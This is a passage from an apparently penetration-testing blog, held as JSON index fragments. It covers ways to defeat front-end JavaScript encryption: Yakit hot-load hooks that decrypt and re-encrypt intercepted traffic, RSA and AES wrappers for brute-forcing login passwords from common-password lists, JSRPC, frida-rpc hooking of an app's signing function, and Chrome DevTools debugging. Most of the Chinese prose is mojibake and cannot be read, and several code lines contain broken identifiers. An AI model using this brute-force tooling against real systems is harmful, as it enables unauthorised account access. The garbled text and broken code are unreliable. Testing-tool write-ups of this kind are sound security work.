è½½ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦å¯¹å…¶è¿›è¡Œäº†è§£ï¼šä»€ä¹ˆæ˜¯çƒ­åŠ è½½ï¼Ÿ å¹¿ä¹‰ä¸Šæ¥è¯´ï¼Œçƒ­åŠ è½½æ˜¯ä¸€ç§å…è®¸åœ¨ä¸åœæ­¢æˆ–é‡å¯åº”ç”¨ç¨‹åºçš„æƒ…å†µä¸‹ï¼ŒåŠ¨æ€åŠ è½½æˆ–æ›´æ–°ç‰¹å®šç»„ä»¶æˆ–æ¨¡å—çš„åŠŸèƒ½ã€‚è¿™ç§æŠ€æœ¯å¸¸ç”¨äºå¼€å‘è¿‡ç¨‹ä¸­ï¼Œæé«˜å¼€å‘æ•ˆç‡å’Œç”¨æˆ·ä½“éªŒã€‚ åœ¨Yakit ä¸­ï¼Œçƒ­åŠ è½½æ˜¯ä¸€ç§é«˜çº§æŠ€æœ¯ï¼Œè®© Yak æˆä¸º Web Fuzzer å’Œç”¨æˆ·è‡ªå®šä¹‰ä»£ç ä¸­çš„æ¡¥æ¢ï¼Œå®ƒå…è®¸æˆ‘ä»¬ç¼–å†™ä¸€æ®µ Yak å‡½æ•°ï¼Œåœ¨ Web Fuzzer è¿‡ç¨‹ä¸­ä½¿ç”¨ï¼Œä»è€Œå®ç°è‡ªå®šä¹‰ fuzztag æˆ–æ›´å¤šåŠŸèƒ½ã€‚ åœ¨MITMç•Œé¢ç‚¹å‡»ä¸‹æ–¹ â€œçƒ­åŠ è½½â€æ ‡ç­¾é¡µï¼Œåœ¨æ°å½“çš„ Hook ç‚¹ç¼–å†™æˆ‘ä»¬å¸Œæœ›æ“ä½œæµé‡åšçš„äº‹å„¿ï¼Œç„¶ååŠ è½½è¿›å¼•æ“ä¸­ï¼Œç­‰å¾…æµé‡æ‰§è¡Œã€‚ é€šè¿‡ä¸€ä¸ªç®€å•çš„å›¾ä¾‹å±•ç¤ºçƒ­åŠ è½½ä»£ç åœ¨æµé‡åŠ«æŒä¸­çš„è¿‡ç¨‹ï¼š ä»¥ä¸‹ç»™å‡ºç¤ºä¾‹ï¼Œå…·ä½“ä»£ç éœ€è¦æ ¹æ®å…·ä½“åœºæ™¯ç¼–å†™ã€‚ è‡ªåŠ¨æ”¾è¡Œæµé‡ï¼šçƒ­åŠ è½½hijackSaveHTTPFlowæ–¹æ³•ï¼Œ æ‰‹åŠ¨åŠ«æŒæµé‡ï¼šhijackHTTPRequest+beforeRequestå¤„ç†è¯·æ±‚ï¼ŒhijackHTTPResponse+afterRequestå¤„ç†å“åº” 1ã€è‡ªåŠ¨æ”¾è¡Œæµé‡ çƒ­åŠ è½½hijackSaveHTTPFlowæ–¹æ³•ï¼Œå¯ä»¥å¯¹è‡ªåŠ¨æ”¾è¡Œçš„è¯·æ±‚å’Œå“åº”è¿›è¡Œè§£å¯†ï¼Œå¹¶ä¸”ä¸å½±å“åŸè¯·æ±‚å“åº” hijackSaveHTTPFlow = func(flow /* *yakit.HTTPFlow */, modify /* func(modified *yakit.HTTPFlow) */, drop/* func0 */ { key = \"1234567890123456\" iv = \"1234567890123456\" // è§£å¯†è¯·æ±‚ request, _ = codec.StrconvUnquote(flow.Request) reqBody = string(poc.GetHTTPPacketBody(request)) regexp = `encryptedData= (*)` cipherUrl = re.FindSubmatch(reqBody, regexp/*string*/)[1] cipherB64 = codec.DecodeUrl(cipherUrl) ~ cipherBytes = codec.DecodeBase64(cipherB64) ~ plainText = string(codec.AEÂ§CBCDecrypt(key /*type: []byte*/, cipherBytes, iv /*type: []byte*/)~) flow. Request = str.ReplaceAll (request,cipherUrl, plainText) // // è§£å¯†å“åº” // response, _ = codec.StrconvUnquote(flow. Response) //...... // flow.Response = str.ReplaceAll(response,ciphel, plain Text) modify(flow) } 2ã€æ‰‹åŠ¨åŠ«æŒæµé‡ 2.1ã€çƒ­åŠ è½½hijackHTTPRequest æ–¹æ³•ï¼Œå¯ä»¥å¯¹æ‰‹åŠ¨åŠ«æŒçš„è¯·æ±‚è¿›è¡Œè§£å¯†ï¼Œä½†å‘ç»™æœåŠ¡å™¨ä¹‹å‰ï¼Œéœ€è¦é…åˆbeforeRequest æ–¹æ³•å†è¿›è¡ŒåŠ å¯† å¤„ç†å“åº”: hijackHTTPResponse+afterRequest hijackHTTPRequest = func(isHttps, url, req, forward /*func(modifiedRequest []byte)*/, drop /*func() */) { key = \"1234567890123456\" iv = \"1234567890123456\" reqBody = string(poc.GetHTTPPacketBody(req)) regexp = `encryptedData=(.*)` cipherUrl = re.FindSubmatch(reqBody, regexp/*string*/)[1] cipherB64 = codec. DecodeUr(cipherUrl)~ cipherBytes = codec.DecodeBase64(cipherB64)~ plainText = string(codec.AESCBCDecrypt(key /*type:[]byte*/, cipherBytes, iv /*type:[]byte*/)~) modified = req.ReplaceAll(cipherUrl, plainText) forward(poc.FixHTTPRequest(modified)) } 2.2ã€beforeRequestæ–¹æ³•ï¼Œå‘ç»™æœåŠ¡å™¨ä¹‹å‰ï¼Œè¿˜åŸåŠ å¯†æµç¨‹è¿›è¡ŒåŠ å¯† beforeRequest = func(ishttps, oreq/*åŸå§‹è¯·æ±‚*/ï¼Œreq/*hijackä¿®æ”¹åçš„è¯·æ±‚*/){ key = \"1234567890123456\" iv = \"1234567890123456\" reqBody = string(poc.GetHTTPPacketBody(req)) regexp = `encryptedData=(.*)` plainText = re.FindSubmatch(reqBody, regexp/*string*/)[1] cipherBytes = codec.AESCBCEndypt(key /*type: []byte*/, plainText, iv /*type: [byte*/)~ cipherB64 = codec.EncodeBase64(cipherBytes) cipherUrl = codec.EscapeUrl(cipherB64) req = req.ReplaceAll(plainText, cipherUrl) return [byte(req) } WebFuzzeræ¨¡å—ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨çƒ­åŠ è½½æ¥è¿›è¡Œæ‰¹é‡æšä¸¾çˆ†ç ´ ç¼–å†™çƒ­åŠ è½½çš„å‡½æ•°ï¼Œå¦‚rsaå‡½æ•°è¿›è¡ŒRSAåŠ å¯† rsa = func(param) { pemBytes = []byte(`-----BEGIN PUBLIC KEY ----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYIIDYCkzujvi NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btiM DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3cb ocDbsNeCwNpRxwjldQIDAQAB -----END PUBLIC KEY -----`) cipherB64 = codec.EncodeBase64(codec.RSAEncryptWithPKCS1v15(pemBytes /*type: []byte*/, param) ~) cipherUrl = codec.EscapeUrl(cipherB64) return cipherUrl } åœ¨è¯·æ±‚åŒ…ä¸­æ ‡è®°éœ€è¦æ‰§è¡ŒRSAåŠ å¯†çš„éƒ¨åˆ†ï¼Œè°ƒç”¨çƒ­åŠ è½½å‡½æ•°rsa // å¯¹æ•´ä½“æ•°æ®åŒ…è¿›è¡ŒrsaåŠ å¯† {{yak(rsa|{\"username\": \"admin\", \"password\":\"123456\"})}} // å¯¹passwordå­—æ®µè¿›è¡Œæšä¸¾ï¼Œå†å¯¹æ•´ä½“æ•°æ®åŒ…è¿›è¡ŒrsaåŠ å¯† {{yak(rsa|{\"username\": \"admin\", \"password\":\"{{payload(pass top25)}}\"})}} å®˜æ–¹æ¡ˆä¾‹ï¼šçƒ­åŠ è½½åœºæ™¯æ¡ˆä¾‹ï¼šçˆ†ç ´aes cbcåŠ å¯† å¯ä»¥é€šè¿‡å®˜æ–¹æ¡ˆä¾‹æ›´æ·±å…¥äº†è§£ Yakit çš„çƒ­åŠ è½½åŠŸèƒ½åŠç”¨æ³• å®˜æ–¹ä¸­çš„AESåŠ å¯†å‡½æ•° handle handle = func(p) { key = codec.DecodeHex(\"31323334313233343132333431323334\")~ iv = codec.DecodeHex(\"03395d68979ed8632646813f4c0bbdb3\")~ usernameDict = [\"admin\"] // passwordDict = x\"{{x(pass_top25)}}\" // æˆ‘ä»¬å¯ä»¥ä½¿ç”¨xå‰ç¼€å­—ç¬¦ä¸²æ¥é€šè¿‡fuzztagè¯­æ³•è·å–pass_top25å­—å…¸ä¸­çš„å€¼ passwordDict = [\"admin\", \"123456\", \"admin123\", \"88888888\", \"666666\"] // ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨æ‰‹å†™çš„list resultList = [] for username in usernameDict { for password in passwordDict { m = {\"username\": username, \"password\": password} jsonInput = json.dumps(m) result = codec.AESCBCEncryptWithPKCS7Padding(key, jsonInput, iv)~ base64Result = codec.EncodeBase64(result) resultList.Append(base64Resu","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:5:3","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"äº”ã€JSRPC JSRPCç®€å•æ¥è¯´å°±æ˜¯è¿œç¨‹è°ƒç”¨JavaScriptå‡½æ•°çš„æ–¹æ³•ã€‚ RPCï¼ˆRemote Procedure Callï¼Œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰æ˜¯ä¸€ç§é€šè¿‡ç½‘ç»œè®©ç¨‹åºè°ƒç”¨å¦ä¸€å°è®¡ç®—æœºä¸Šçš„æœåŠ¡æˆ–ç¨‹åºçš„æŠ€æœ¯ã€‚å®ƒå…è®¸ç¨‹åºåœ¨ä¸åŒçš„åœ°å€ç©ºé—´ï¼ˆé€šå¸¸æ˜¯ä¸åŒçš„è®¡ç®—æœºï¼‰ä¹‹é—´è°ƒç”¨å‡½æ•°æˆ–æ–¹æ³•ï¼Œå¹¶ä¸”å¯ä»¥åŸºäºå¤šç§åè®®å®ç°ã€‚ ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:6:0","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"JSRPCåŸç† JSRPCçš„åŸç†æ˜¯åœ¨å®¢æˆ·ç«¯ï¼ˆå³æµè§ˆå™¨ï¼‰æ³¨å…¥ JSRPCç¯å¢ƒï¼Œä½¿å®¢æˆ·ç«¯ä¸JSRPCæœåŠ¡å™¨å»ºç«‹WebSocketè¿æ¥ï¼Œä¿æŒé€šä¿¡ã€‚ç„¶ååœ¨å®¢æˆ·ç«¯æ³¨å†Œéœ€è¦ç”¨åˆ°çš„åŠ è§£å¯†å‡½æ•°çš„demoï¼Œè¿™æ ·å½“JSRPCæœåŠ¡å™¨å‘é€ä¿¡æ¯ç»™å®¢æˆ·ç«¯æ—¶ï¼Œå®¢æˆ·ç«¯æ¥æ”¶åˆ°å¹¶æ‰§è¡Œç›¸åº”çš„æ–¹æ³•ï¼Œç„¶åå°†ç»“æœå‘é€å›æœåŠ¡å™¨ã€‚æœåŠ¡å™¨æ¥æ”¶åˆ°ç»“æœå¹¶å°†å…¶æ˜¾ç¤ºå‡ºæ¥ã€‚ JSRPC ä¸€èˆ¬éƒ½æ˜¯åŸºäº WebSocket æˆ–è€… WebSocket Secureåè®®å®ç°ï¼Œè¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹è¿™ä¿©åè®®ï¼š WebSocket æ˜¯åŸºäº TCP çš„åº”ç”¨å±‚åè®®ï¼Œé‡‡ç”¨åŒå‘é€šä¿¡æ¨¡å¼ï¼Œå°±åƒä¸€æ ¹ä¸¤ç«¯å¼€å£çš„ç®¡é“ã€‚å½“å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å»ºç«‹è¿æ¥åï¼ŒåŒæ–¹éƒ½èƒ½éšæ—¶å‘å¯¹æ–¹å‘é€æ•°æ®ï¼Œå…¶åè®®è¯·æ±‚ url ä»¥ ws:// å¼€å¤´ã€‚è¿™ç§ç‰¹æ€§ä½¿å¾— WebSocket é€‚ç”¨äºéœ€è¦å®æ—¶äº¤äº’çš„åœºæ™¯ï¼Œå¦‚åœ¨çº¿èŠå¤©ã€å®æ—¶æ•°æ®å±•ç¤ºç­‰ã€‚ WebSocket Secureï¼ˆWSSï¼‰æ˜¯ WebSocket çš„åŠ å¯†ç‰ˆæœ¬ï¼Œä¹Ÿæ˜¯é‡‡ç”¨åŒå‘é€šä¿¡æ¨¡å¼ï¼Œè¯·æ±‚åè®®ä»¥ wss:// å¼€å¤´ã€‚ä¸ºäº†ç»´æŒç¨³å®šçš„é•¿è¿æ¥ï¼ŒWSS é€šå¸¸éœ€è¦æ¯éš”ä¸€æ®µæ—¶é—´å‘é€å¿ƒè·³åŒ…ï¼Œæ¯”å¦‚ç®€å•çš„ ping æ¶ˆæ¯ã€‚æ­£å› å¦‚æ­¤ï¼ŒWSS å¸¸ç”¨äºå¯¹æ•°æ®å®‰å…¨æ€§è¦æ±‚è¾ƒé«˜çš„åœºæ™¯ï¼Œåƒç¤¾äº¤èŠå¤©å®¤ã€è‚¡ç¥¨å®æ—¶æŠ¥ä»·ã€ç›´æ’­é—´ä¿¡æ¯æµç­‰ã€‚ WebSocket ä¸ WSS çš„å…³ç³» å’Œ http ä¸ https çš„å…³ç³»ç±»ä¼¼ã€‚ ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:6:1","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"æ•´ä½“æµç¨‹ ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:6:2","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"ä½¿ç”¨æ–¹æ³• JsRPCé¡¹ç›® JsRPC-hliang æ˜¯ç”¨ go è¯­è¨€å†™çš„ï¼Œæ˜¯ä¸“é—¨ä¸º JS é€†å‘åšçš„é¡¹ç›®ã€‚ Githubé¡¹ç›®åœ°å€ï¼šhttps://github.com/jxhczhl/jsrpc ä»Githubä¸‹è½½ jsrpcæœåŠ¡ç«¯ ç¯å¢ƒï¼Œæ­å»ºRPCæœåŠ¡ç«¯ 1ã€å¯åŠ¨æœåŠ¡ç«¯ å¯åŠ¨ä¸€ä¸ªJSRPCæœåŠ¡ï¼Œç„¶åç›‘å¬12080ç«¯å£ï¼Œ $ ./jsRpc __ _______..______ .______ ______ | | / || _ \\ | _ \\ / | | | | (----`| |_) | | |_) | | ,----' .--. | | \\ \\ | / | ___/ | | | `--' | .----) | | |\\ \\----.| | | `----. \\______/ |_______/ | _| `._____|| _| \\______| INFO[2025-04-29 18:08:08] å½“å‰ç›‘å¬åœ°å€ï¼š0.0.0.0:12080 sslå¯ç”¨çŠ¶æ€ï¼šfalse 2ã€æ³¨å…¥ç¯å¢ƒ ç½‘é¡µå¼€å¯F12æ§åˆ¶å°ï¼Œåœ¨å®¢æˆ·ç«¯æ§åˆ¶å°æ³¨å…¥JSRPCç¯å¢ƒã€‚ æ‰“å¼€ /resouces/JsEnv_De.js å¤åˆ¶æ–‡ä»¶ä¸­çš„å…¨éƒ¨ä»£ç ï¼Œç²˜è´´åˆ°æµè§ˆå™¨æ§åˆ¶å°å¹¶æ‰§è¡Œ(æ³¨æ„ï¼šå¯ä»¥åœ¨æµè§ˆå™¨å¼€å¯çš„æ—¶å€™å°±å…ˆæ³¨å…¥ç¯å¢ƒï¼Œä¸è¦åœ¨è°ƒè¯•æ–­ç‚¹æ—¶å€™æ³¨å…¥) 3ã€å»ºç«‹é€šä¿¡ ç„¶ååœ¨æ§åˆ¶å°å»ºç«‹é“¾æ¥JSRPCæœåŠ¡å™¨çš„é€šä¿¡ // æ³¨å…¥ç¯å¢ƒåè¿æ¥é€šä¿¡ var demo = new Hlclient(\"ws://127.0.0.1:12080/ws?group=zzz\"); // å¯é€‰ //var demo = new Hlclient(\"ws://127.0.0.1:12080/ws?group=zzz\u0026clientId=hliang/\"+new Date().getTime()) ä¸Šè¿°è¯­å¥æ‰§è¡ŒæˆåŠŸåï¼ŒæœåŠ¡ç«¯ä¼šæœ‰å¦‚ä¸‹æç¤ºï¼š INFO[2025-04-29 18:08:08] å½“å‰ç›‘å¬åœ°å€ï¼š0.0.0.0:12080 sslå¯ç”¨çŠ¶æ€ï¼šfalse INFO[2025-04-29 18:11:25] [æ–°ä¸Šçº¿group:zzz,clientId:-\u003ee87f9ab1-59a2-4526-971b-5e373a4af448] 4ã€å®šä½å…³é”®å‡½æ•° æ‰¾åˆ°åŠ è§£å¯†ã€ç­¾åã€æ ¡éªŒç­‰é€»è¾‘æ‰€åœ¨çš„å…³é”®å‡½æ•°ï¼Œæ‰“æ–­ç‚¹ï¼Œä¸ºå…³é”®å‡½æ•°æ³¨å†Œå¯ä»¥è¿œç¨‹è°ƒç”¨çš„æ–¹æ³•ã€‚ ç¤ºä¾‹ï¼š åœ¨æµè§ˆå™¨æ§åˆ¶å°ä¸­è¿›è¡Œæ³¨å†Œ // æ³¨å†Œä¸€ä¸ªæ–¹æ³• ç¬¬ä¸€ä¸ªå‚æ•°helloä¸ºæ–¹æ³•åï¼Œ // ç¬¬äºŒä¸ªå‚æ•°ä¸ºå‡½æ•°ï¼Œresolveé‡Œé¢çš„å€¼æ˜¯æƒ³è¦çš„å€¼(å‘é€åˆ°æœåŠ¡å™¨çš„) demo.regAction(\"hello\", function (resolve) { //è¿™æ ·æ¯æ¬¡è°ƒç”¨å°±ä¼šè¿”å›â€œå¥½å›°å•Š+éšæœºæ•´æ•°â€ var Js_sjz = \"å¥½å›°å•Š\"+parseInt(Math.random()*1000); resolve(Js_sjz); }) è®¿é—®æ¥å£ï¼Œè·å¾—jsç«¯çš„è¿”å›å€¼: http://127.0.0.1:12080/go?group=zzz\u0026action=hello æœ€å¸¸ç”¨çš„æ˜¯å¸¦å‚æ•°å–å€¼ï¼Œå¯ä»¥è¿™ä¹ˆç”¨ //å‡è®¾æœ‰ä¸€ä¸ªå‡½æ•° éœ€è¦ä¼ é€’ä¸¤ä¸ªå‚æ•° function hlg(User,Status){ return User+\"è¯´ï¼š\"+Status; } demo.regAction(\"hello3\", function (resolve,param) { //è¿™é‡Œè¿˜æ˜¯paramå‚æ•° paramé‡Œé¢çš„key æ˜¯å…ˆè¿™é‡Œå†™ï¼Œä½†åˆ°æ—¶å€™ä¼ æ¥å£å°±å¿…é¡»å¯¹åº”çš„ä¸Š res=hlg(param[\"user\"],param[\"status\"]) resolve(res); }) pythonè„šæœ¬ä¸­è°ƒç”¨ url = \"http://127.0.0.1:12080/go\" data = { \"group\": \"zzz\", \"action\": \"hello3\", \"param\": json.dumps({\"user\":\"é»‘è„¸æ€ª\",\"status\":\"å¥½å›°å•Š\"}) } print(data[\"param\"]) #dumpsåå°±æ˜¯é•¿è¿™æ ·çš„å­—ç¬¦ä¸²{\"user\": \"\\u9ed1\\u8138\\u602a\", \"status\": \"\\u597d\\u56f0\\u554a\"} res=requests.post(url, data=data) #è¿™é‡Œæ¢getä¹Ÿæ˜¯å¯ä»¥çš„ print(res.text) åç»­å°±æ˜¯éœ€è¦æ³¨å†Œéœ€è¦è°ƒç”¨å“ªä¸ªå‡½æ•°çš„æ–¹æ³•ï¼ŒJSRPCä½œè€…ä¹Ÿæ˜¯æä¾›äº†demoï¼Œè¿‡ä¸€éå°±è¡Œã€‚ 5ã€æµ‹è¯•è°ƒç”¨ è®¿é—®å¯¹åº”é“¾æ¥ï¼Œæµ‹è¯•æ˜¯å¦æ­£å¸¸è¿›è¡ŒåŠ è§£å¯† è¿™é‡Œæˆ‘ä»¬åªéœ€è¦æ³¨å†Œç›¸åº”è°ƒç”¨å‡½æ•°çš„æ–¹æ³•å°±å¯ä»¥äº† import requests import json js_code = \"\"\" (function(){ console.log(\"test\") return \"æ‰§è¡ŒæˆåŠŸ\" })() \"\"\" url = \"http://localhost:12080/execjs\" data = { \"group\": \"zzz\", \"code\": js_code } res = requests.post(url, data=data) print(res.text) url = \"http://127.0.0.1:12080/go\" data = { \"group\": \"zzz\", \"action\": \"hello3\", \"param\": json.dumps({\"user\":\"é»‘è„¸æ€ª\",\"status\":\"å¥½å›°å•Š\"}) } print(data[\"param\"]) #dumpsåå°±æ˜¯é•¿è¿™æ ·çš„å­—ç¬¦ä¸²{\"user\": \"\\u9ed1\\u8138\\u602a\", \"status\": \"\\u597d\\u56f0\\u554a\"} res=requests.post(url, data=data) #è¿™é‡Œæ¢getä¹Ÿæ˜¯å¯ä»¥çš„ print(res.text) é¡¹ç›®ä¸Šä½¿ç”¨ é€šè¿‡è°ƒè¯•ï¼Œæ‰¾åˆ°åŠ è§£å¯†ä½ç½®ï¼Œå°†åŠ è§£å¯†å‡½æ•°è¿›è¡Œæ³¨å†Œï¼Œé€šè¿‡go?group={}\u0026action={}\u0026param={}æ¥å£è°ƒç”¨æ³¨å†Œçš„å‡½æ•°å®ç°åŠ è§£å¯†ã€‚ é€»è¾‘è°ƒè¯•é€šé¡ºåï¼Œå¯ä»¥ä½¿ç”¨ mitmproxy è¿›è¡Œä»£ç† https://github.com/mitmproxy/mitmproxy https://github.com/mochazi/mitmproxy-doc-cn Burpé…ç½®ä¸Šæ¸¸ä»£ç†ï¼Œè®¾ç½®ä»£ç†æ¡ä»¶å³å¯è¿›è¡Œè‡ªåŠ¨åŒ–è°ƒç”¨jsRpcè¿›è¡ŒåŠ è§£å¯† è‹¥ä¸ä½¿ç”¨jsrpcï¼Œä¼ ç»Ÿæ–¹æ³•æ˜¯å…ˆæ‰¾åˆ°å‰ç«¯æ‰€æœ‰æ¶‰åŠåŠ è§£å¯†éƒ¨åˆ†JSä»£ç å¹¶æ›¿æ¢ä¸ºç©ºï¼ŒæŠŠè¿™éƒ¨åˆ†ä»£ç è¡¥å……ç¯å¢ƒåˆ°å¯ä»¥æœ¬åœ°è¿è¡Œåï¼Œå†é€šè¿‡mitmproxyæˆ–burpæ’ä»¶åšåˆ°æ‹¦æˆªè¯·æ±‚æ—¶æ˜æ–‡ï¼Œå‘é€è¯·æ±‚ååŠ å¯†ï¼Œç›¸å¯¹çš„å“åº”éƒ¨åˆ†åŒç† è€Œjsrpcçš„å‡ºç°ï¼Œå¯ä»¥è®©æˆ‘ä»¬è·³è¿‡æ‰£ä»£ç è¡¥ç¯å¢ƒè¿™ä¸€æ­¥ï¼Œç›´æ¥åœ¨å‘é€è¯·æ±‚æ—¶è°ƒç”¨å‰ç«¯åŸæœ¬çš„åŠ å¯†å‡½æ•°è¿›è¡ŒåŠ å¯†å¤„ç† æ¡ˆä¾‹ï¼š JsRpcè”åŠ¨burpå®ç°è‡ªåŠ¨åŠ è§£å¯†ï¼ˆè¯¦ç»†ç‰ˆï¼‰ï¼šç”¨æ¡ˆä¾‹è®²è§£JsRpcï¼Œé…åˆBurp Sekiroæ¡†æ¶ Sekiro æ˜¯ç”±é‚“ç»´ä½³å¤§ä½¬ï¼Œä¿—ç§°æ¸£æ€»ï¼Œå…¶åŠŸèƒ½æ›´åŠ å¼ºå¤§ï¼Œå†™çš„ä¸€ä¸ªåŸºäºé•¿é“¾æ¥å’Œä»£ç æ³¨å…¥çš„ Android Private API æš´éœ²æ¡†æ¶ï¼Œå¯ä»¥ç”¨åœ¨ APP é€†å‘ã€APP æ•°æ®æŠ“å–ã€Android ç¾¤æ§ç­‰åœºæ™¯ï¼ŒåŒæ—¶ Sekiro ä¹Ÿæ˜¯ç›®å‰å…¬å¼€æ–¹æ¡ˆå”¯ä¸€ç¨³å®šçš„ JSRPC æ¡†æ¶ã€‚ é¡¹ç›®åœ°å€ï¼šhttps://github.com/yint-tech/sekiro-open å®˜æ–¹æ–‡æ¡£ï¼šhttps://sekiro.iinti.cn/sekiro-doc/ frida-rpc 1ã€æ‰“å¼€appï¼Œæ‰‹æœºå¯ç”¨frida 2ã€ç”µè„‘é€šè¿‡fridaè°ƒç”¨å†…å­˜ä¸­çš„ç­¾åå‡½æ•°ï¼Œå¹¶å¼€å¯æœ¬åœ°æ¥å£ä¼ é€’å‚æ•°å€¼ ç›¸å…³è„šæœ¬ from fastapi import FastAPI, HTTPException from pydantic import BaseModel import uvicorn import frida # hookå…³é”®å‡½æ•°ï¼Œç”Ÿæˆç­¾åå€¼ jsCode = \"\"\" function getsign(data){ let result = \"\"; Java.perform(function () { let XX = Java.use(\"java.XX.XX\").$new(); result = Java.use(\"com.xx.SignUtils\").c(XX, XX) }) return result; } rpc.exports = (rpcfunc: getsign); \"\"\" process = frida.get_usb._device().attachï¼ˆXXï¼‰#åŒ…åæ³¨å…¥ script = process.create_script(jsCode) script.load() def get_ts(): # å…¶ä»–æˆ³å‚æ•°ç”Ÿæˆ ts = XXX return ts app = FastAPI() # åˆ›å»º FastAPI åº”ç”¨ class ParamsRequest(BaseModel):# å®šä¹‰è¯·æ±‚æ¨¡å‹ params: str class SignResponse(BaseModel): # å®šä¹‰å“åº”æ¨¡å‹ sign: str Ts: str @app.postï¼ˆ\"/sign\"ï¼Œ response_model=SignResponseï¼‰ # å®šä¹‰ signæ¥å£ async def sign(request: ParamsRequest): try: Ts = get_ts() sign = script.exports_sync.rpcfunc(request.params+Ts) return {\"si","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:6:3","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"å…­ã€CDP CDPåè®®ï¼ˆChrome DevTools Protocolï¼‰æ˜¯Chrome åŸç”Ÿæ”¯æŒçš„è°ƒè¯•åè®®ï¼Œé€šè¿‡ WebSocket è¿æ¥æ§åˆ¶æµè§ˆå™¨å®ä¾‹ã€‚ ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:7:0","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"CDPåè®®åŸç† æ”¯æŒåŠ¨æ€ç›‘æ§ JS æ‰§è¡Œã€ä¿®æ”¹ DOMã€è°ƒç”¨å‡½æ•°ç­‰ï¼Œé€‚ç”¨äºåŠ è§£å¯†é€»è¾‘çš„å®æ—¶è°ƒè¯•ã€‚ é€šè¿‡ Chrome æµè§ˆå™¨çš„åŸç”Ÿè°ƒè¯•æ¥å£ï¼ˆCDPï¼‰ï¼Œå¯åœ¨æ–­ç‚¹å¤„ç›´æ¥æ‰§è¡Œ JS è¡¨è¾¾å¼ï¼Œè·å–ä½œç”¨åŸŸå†…çš„å˜é‡æˆ–è°ƒç”¨å‡½æ•°ï¼Œæ·±åº¦åˆ©ç”¨æµè§ˆå™¨è°ƒè¯•åŠŸèƒ½ã€‚ ","date":"2025-07-10","objectID":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/:7:1","tags":["Pentest","crypto"],"title":"å‰ç«¯JSåŠ è§£å¯†å¯¹æŠ—æ–¹æ³•ç®€è¿°","uri":"/posts/20250710-%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AF%B9%E6%8A%97/"},{"categories":["Pentest"],"content":"æ•´ä½“æµç¨‹ å·¥ä½œæµï¼š å¯åŠ¨ Chrome æ—¶å¼€å¯è°ƒè¯•ç«¯å£ï¼ˆ--remote-debugging-port=9222ï¼‰ã€‚ é€šè¿‡ CDP å®¢æˆ·ç«¯ï¼ˆå¦‚ Puppeteerï¼‰å‘é€å‘½ä»¤æ‰§è¡Œ JS å‡½æ•°æˆ–æ•è·åŠ å¯†è¿‡ç¨‹ å…¸å‹å·¥å…·ï¼šChrome DevToolsã€åŸºäº CDP çš„è‡ªå®šä¹‰è„šæœ¬ï¼ˆå¦‚ Python è°ƒç”¨ï¼‰ ç»ƒæ‰‹åœ°å€ï¼šhttps://github.com/0ctDay/encrypt-decrypt-vuls åŸåˆ›é¡¹ç›®ï¼šhttps://github.com/Nstkm001/CDP_test ç”¨äºå¿«é€Ÿç”ŸæˆåŠ 